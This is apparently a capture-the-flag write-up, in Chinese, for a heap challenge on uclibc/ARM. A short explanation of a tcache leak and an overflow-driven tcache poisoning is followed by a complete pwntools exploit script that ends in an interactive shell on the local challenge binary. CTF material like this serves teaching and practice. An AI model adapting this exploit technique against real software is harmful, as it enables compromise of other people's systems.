# writeup
一道比较简单的heap题目
只不过环境变成了
```
uclibc + arm
```
因为uclibc当中也加入了tcache的机制
所以可以通过tcache机制对heap上的地址进行泄露
然后在edit函数当中能够溢出任意大小的字节
因此可以修改堆后面的数据
通过tcache attack
劫持程序的控制流就能够进行ROP
最后获得程序的控制权

# exploit
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './a.out'


io = process(['qemu-arm', '-g', '1234', '-L', './', './a.out'])

context.log_level = 'debug'

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

def menu(idx):
    io.recvuntil('>>> ')
    io.sendline(str(idx))

def add(tag, length):
    menu(2)
    io.recvuntil("Length:")
    io.sendline(str(length))
    io.recvuntil("Tag:")
    io.send(str(tag))

def show():
    menu(1)

def change(i, l, t):
    menu(3)
    io.recvuntil("Index:")
    io.sendline(str(i))
    io.recvuntil("Length:")
    io.sendline(str(l))
    io.recvuntil("Tag:")
    io.send(str(t))

def remove(i):
    menu(4)
    io.recvuntil("Tag:")
    io.sendline(str(i))


for i in range(10):
    add(str(i) * 8, 0x60)
remove(0)
change(1, 0x100, 'a' * 0x60 + p32(0xd0) + p32(0x68))
remove(2)
add('0', 0x60)
add('2', 0x60)
remove(1)
remove(5)
show()
io.recvuntil("2 : ")
libc_addr = u32(io.recvn(4))
heap_addr = u32(io.recvuntil("3 :")[:-3].ljust(4, '\x00'))
log.info("\033[33m" + hex(libc_addr) + "\033[0m")
log.info("\033[33m" + hex(heap_addr) + "\033[0m")

mangle = heap_addr >> 12
log.info("\033[33m" + hex(mangle) + "\033[0m")

for i in range(10):
    add('/bin/sh\0', 0x30)

remove(13)
change(12, 0x100, 'a' * 0x30 + p32(0) + p32(0x39) + p32(mangle ^ (0x21030)))

add('yyy', 0x30)
add(p32(- 0x490ec + libc_addr), 0x30)

remove(17)

io.interactive()


```